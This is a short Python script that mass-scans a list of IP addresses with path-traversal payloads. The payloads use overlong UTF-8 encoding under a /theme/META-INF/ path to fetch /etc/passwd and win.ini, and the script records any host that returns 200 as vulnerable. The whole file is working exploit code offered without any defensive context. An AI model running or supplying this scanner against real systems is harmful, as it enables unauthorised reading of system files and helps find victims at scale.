import requests
import time

payload_linux='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
paylaod_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'

}
for ip in open('ip.txt','r'):
    ip=ip.replace('\n','')
    try:
        vuln_code_l=requests.get(ip+payload_linux,headers=headers).status_code
        vuln_code_w=requests.get(ip+paylaod_windows,headers=headers).status_code
        print("check->"+ip)
    except Exception as error:
        pass
    if vuln_code_l==200 or vuln_code_w ==200:
        with open(r'ip_vuln.txt','a+') as f:
            f.write(ip+'\n')
            f.close()
